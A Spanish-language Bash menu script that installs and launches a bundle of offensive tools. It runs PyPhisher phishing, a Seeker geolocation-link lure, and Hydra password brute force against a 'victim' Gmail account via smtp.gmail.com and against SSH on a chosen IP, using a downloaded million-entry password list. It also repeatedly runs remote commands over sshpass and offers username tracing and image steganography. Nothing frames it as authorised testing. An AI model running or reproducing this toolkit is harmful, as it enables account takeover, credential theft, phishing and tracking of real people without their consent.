#!/bin/bash

# Función para mostrar una barra de carga con nombre de dependencia
show_progress() {
    local duration="$1"   # Duración en segundos
    local dependency_name="$2"  # Nombre de la dependencia
    local progress=0
    local bar_length=50
    local sleep_duration=$((duration / bar_length))

    # Asegurarse de que el nombre de la dependencia tenga una longitud fija
    dependency_name=$(printf "%-25s" "$dependency_name")

    # Obtener la ruta de lolcat usando 'which' y ejecutarlo
    local lolcat_command=$(which lolcat)
    
    if [ -x "$lolcat_command" ]; then
        echo -e "Instalando \e[34m$dependency_name\e[0m" | "$lolcat_command"
    else
        echo -e "Instalando \e[34m$dependency_name\e[0m"
    fi
    
    echo -n "["
    for ((i = 0; i < bar_length; i++)); do
        echo -n "#"
        sleep "$sleep_duration"
    done
    echo -n "] 100%"
    echo ""  # Salto de línea después de la barra de progreso
}
# Función para instalar una dependencia específica
install_dependency() {
    local dependency_name="$1"  # Nombre de la dependencia
    echo "Instalando $dependency_name..."

    case "$dependency_name" in
        "Actualización de paquetes")
            sudo apt update >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "Metasploit Framework")
            sudo apt install --yes metasploit-framework >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "Snap Metasploit")
            sudo snap install metasploit-framework >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "Hydra")
            sudo apt install --yes hydra >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "Nmap")
            sudo apt install --yes nmap >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "Dsniff")
            sudo apt install --yes dsniff >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "SSH")
            sudo apt install --yes ssh >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "Nftables")
            sudo apt install --yes nftables >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "Image-ExifTool Perl")
            sudo apt install --yes libimage-exiftool-perl >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "Hping3")
            sudo apt install --yes hping3 >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "Curl")
            sudo apt install --yes curl >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "Git, Python3, PHP, SSH Client")
            sudo apt install --yes git python3 php openssh-client -y >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "PyPhisher")
            git clone https://github.com/KasRoudra/PyPhisher >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "Egyscan")
            git clone https://github.com/dragonked2/Egyscan.git >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "PyPhisher Requirements")
            cd PyPhisher
            pip3 install -r files/requirements.txt >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            cd ..
            ;;
        "Blackbird")
            git clone https://github.com/p1ngul1n0/blackbird.git >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "Blackbird Requirements")
            cd blackbird
            pip3 install -r requirements.txt >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            cd ..
            ;;
        "Sherlock")
            git clone https://github.com/sherlock-project/sherlock.git >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "Sherlock Requirements")
            python3 -m pip install -r sherlock/requirements.txt >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            ;;
        "SecLists")
            wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            mv 10-million-password-list-top-1000000.txt diccionario.txt
            ;;
        "Seeker")
            git clone https://github.com/thewhiteh4t/seeker.git >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            cd seeker/
            chmod +x install.sh
            ./install.sh >/dev/null 2>&1
            show_progress 1 "Seeker Installation"
            cd ..
            ;;
        "Egyscan Requirements")
            cd Egyscan
            sudo pip install -r requirements.txt >/dev/null 2>&1
            show_progress 1 "$dependency_name"
            cd ..
            ;;
        *)
            echo "Dependencia desconocida: $dependency_name"
            ;;
    esac
}

# Instala todas las dependencias
install_dependencies() {
    # Lista de dependencias a instalar
    dependencies=(
        "Actualización de paquetes"
        "Metasploit Framework"
        "Snap Metasploit"
        "Hydra"
        "Nmap"
        "Dsniff"
        "SSH"
        "Nftables"
        "Image-ExifTool Perl"
        "Hping3"
        "Curl"
        "Git, Python3, PHP, SSH Client"
        "PyPhisher"
        "Egyscan"
        "PyPhisher Requirements"
        "Blackbird"
        "Blackbird Requirements"
        "Sherlock"
        "Sherlock Requirements"
        "SecLists"
        "Seeker"
        "Egyscan Requirements"
    )

    total_dependencies="${#dependencies[@]}"
    current_dependency=0

    echo "Instalando dependencias..."

    while [ $current_dependency -lt $total_dependencies ]; do
        dependency="${dependencies[$current_dependency]}"
        install_dependency "$dependency"
        ((current_dependency++))
    done

    echo "Dependencias instaladas correctamente."

}

clear;

menu="
 ---------------------------------------------------------
|                  (っ◔◡◔)っ  Menu                         |
|---------------------------------------------------------|
| 0 - Instalar Dependencias                               |
| 1 - Phishing                                            |
| 2 - Ataques de Contraseña                               |
| 3 - Metadatos                                           |
| 4 - Localizar                                           |
| 5 - Pruebas de Vulnerabilidad                           |
 ----------------------------------------------------------
"

for ((i = 0; i < ${#menu}; i++)); do
    echo -n "${menu:$i:1}"
    sleep 0.001
done

while [ "$opcion" != 6 ]; do
    clear;

    echo " ";
    echo " ---------------------------------------------------------";
    echo "|                  (っ◔◡◔)っ  Menu                         |";
    echo "|---------------------------------------------------------|";
    echo "| 0 - Instalar Dependencias                               |";
    echo "| 1 - Phishing                                            |";
    echo "| 2 - Ataques de Contraseña                               |";
    echo "| 3 - Metadatos                                           |";
    echo "| 4 - Localizar                                           |";
    echo "| 5 - Pruebas de Vulnerabilidad                           |";
    echo "| 6 - Salir                                               |";
    echo " ----------------------------------------------------------";

    read -p "Escoge opción: " opcion;

    case $opcion in
        0)
            # Instalar todas las dependencias con barra de carga
            echo "Instalando dependencias..."
            sudo apt-get install lolcat --yes
            clear
            install_dependencies &
            install_pid=$!

            while kill -0 $install_pid 2>/dev/null; do
                show_progress 1
            done

            wait $install_pid
            ;;
        1)
            # Phishing
            python3 PyPhisher/pyphisher.py
            ;;
        2)
            while [ "$pass_option" != 0 ]; do
                clear;

                echo " ";
                echo " ---------------------------------------------------------";
                echo "| Submenu de Ataques de Contraseña                        |";
                echo "|---------------------------------------------------------|";
                echo "| 1 - Hydra GMAIL                                         |";
                echo "| 2 - SSH DirectAT                                        |";
                echo "| 3 - Hydra SSH                                           |";
                echo "| 0 - Volver al Menú Principal                            |";
                echo " ----------------------------------------------------------";

                read -p "Escoge opción: " pass_option;

                case $pass_option in
                    1)
                        # Hydra GMAIL
                        read -p "Dime el correo electrónico de la víctima: " visti
                        hydra -s 465 -S -v -V -l $visti -P diccionario.txt -e s -f -t 16 smtp.gmail.com smtp
                        sleep 20
                        ;;
                    2)
                        # SSH DirectAT
                        clear
                        read -p "Usuario: " usuario
                        read -p "IP: " ip
                        hydra -V -f -l $usuario -P diccionario.txt -o results.txt $ip ssh
                        ;;
                    3)
                        # Hydra SSH
                        clear
                        read -p "Dime la contraseña: " contra
                        read -p "Dime el usuario: " usu
                        read -p "Dime la IP: " ip
                        read -p "Que comando quieres usar: " comand
                        watch -n 0.1 sshpass -p $contra ssh -t $usu@$ip " $comand "
                        ;;
                    0)
                        break
                        ;;
                    *)
                        echo "Opción no válida. Introduce una opción válida."
                        ;;
                esac
            done
            ;;
        3)
            while [ "$metadata_option" != 0 ]; do
                clear;

                echo " ";
                echo " ---------------------------------------------------------";
                echo "| Submenu de Metadatos                                    |";
                echo "|---------------------------------------------------------|";
                echo "| 1 - Ver metadatos de un archivo                         |";
                echo "| 2 - Cambiar metadato de archivo                         |";
                echo "| 3 - Borrar metadatos (no borra todos)                   |";
                echo "| 4 - Extraer texto de imagen                             |";
                echo "| 5 - Mostrar contenido oculto de una imagen              |";
                echo "| 6 - Añadir contenido a una imagen                       |";
                echo "| 7 - Fusionar texto a imagen                             |";
                echo "| 0 - Volver al Menú Principal                            |";
                echo " ----------------------------------------------------------";

                read -p "Escoge opción: " metadata_option;

                case $metadata_option in
                    1)
                        # Ver metadatos de un archivo
                        read -p "Dime nombre del archivo: " img
                        exiftool -s $img
                        sleep 10
                        ;;
                    2)
                        # Cambiar metadato de archivo
                        read -p "Dime nombre del archivo: " arch
                        read -p "Dime el nombre del metadato que quieres modificar: " meta
                        read -p "Dime el nuevo valor que quieres añadirle: " valor
                        exiftool -$meta=$valor $arch
                        ;;
                    3)
                        # Borrar metadatos (no borra todos)
                        read -p "Dime el del archivo: " arch
                        exiftool -all= $arch
                        ;;
                    4)
                        # Extraer texto de imagen
                        read -p "Dime nombre del archivo: " img
                        steghide extract -sf $img
                        sleep 5
                        ;;
                    5)
                        # Mostrar contenido oculto de una imagen
                        read -p "Dime nombre de la imagen: " img
                        strings $img
                        sleep 10
                        ;;
                    6)
                        # Añadir contenido a una imagen
                        read -p "Dime el texto que quieres meter en una imagen: " texto
                        read -p "Dime el nombre de la imagen: " nimagen
                        read -p "Dime el nombre de la imagen Final: " fimagen
                        echo "$texto" > .topsecret.txt && cat $nimagen .topsecret.txt > $fimagen
                        ;;
                    7)
                        # Fusionar texto a imagen
                        read -p "Dime el texto que quieres meter en una imagen: " texto
                        read -p "Dime el nombre de la imagen: " nimagen
                        read -p "Dime el nombre del archivo oculto O si el nombre de uno que quieras utilizar: " arch
                        echo $texto > $arch 
                        steghide embed -ef $arch -cf $nimagen
                        ;;
                    0)
                        break
                        ;;
                    *)
                        echo "Opción no válida. Introduce una opción válida."
                        ;;
                esac
            done
            ;;
        4)
            while [ "$locator_option" != 0 ]; do
                clear;

                echo " ";
                echo " ---------------------------------------------------------";
                echo "| Submenu de Localizar                                    |";
                echo "|---------------------------------------------------------|";
                echo "| 2 - Geolocalizar con enlace                             |";
                echo "| 1 - Sherlock + BlackBird                                |";
                echo "| 0 - Volver al Menú Principal                            |";
                echo " ----------------------------------------------------------";

                read -p "Escoge opción: " locator_option;

                case $locator_option in
                    2)
                        cd seeker/
                        python3 seeker.py
                        cd ..
                        ;;
                    1)
                        # Sherlock + BlackBird
                        read -p "Dime el usuario que quieres investigar: " usr
                        cd sherlock
                        python3 sherlock $usr
                        sleep 5
                        cd ..
                        cd blackbird
                        python3 blackbird.py -u $usr
                        cd ..
                        sleep 60
                        ;;
                    0)
                        break
                        ;;
                    *)
                        echo "Opción no válida. Introduce una opción válida."
                        ;;
                esac
            done
            ;;
        5)
            while [ "$vuln_option" != 0 ]; do
                clear;

                echo " ";
                echo " ---------------------------------------------------------";
                echo "| Submenu de Pruebas de Vulnerabilidad                    |";
                echo "|---------------------------------------------------------|";
                echo "| 1 - Egyscan                                             |";
                echo "| 0 - Volver al Menú Principal                            |";
                echo " ----------------------------------------------------------";

                read -p "Escoge opción: " vuln_option;

                case $vuln_option in
                    1)
                        python3 Egyscan/egy.py 
                        ;;
                    0)
                        break
                        ;;
                    *)
                        echo "Opción no válida. Introduce una opción válida."
                        ;;
                esac
            done
            ;;
        6)
            exit
            ;;
        *)
            echo "Opción no válida. Introduce una opción válida."
            ;;
    esac
done
